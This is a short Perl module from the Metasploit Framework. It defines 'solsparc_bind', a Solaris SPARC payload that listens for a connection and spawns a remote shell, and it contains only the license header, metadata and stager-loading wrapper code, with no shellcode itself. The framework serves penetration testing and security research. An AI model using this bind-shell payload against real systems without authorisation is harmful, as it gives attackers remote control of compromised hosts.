
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::solsparc_bind;
use strict;
use base 'Msf::PayloadComponent::SolarisShellStage';
sub load {
  Msf::PayloadComponent::SolarisShellStage->import('Msf::PayloadComponent::SolarisBindStager');
}

my $info =
{
  'Name'         => 'solsparc_bind',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'optyx <optyx [at] uberhax0r.net>', ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
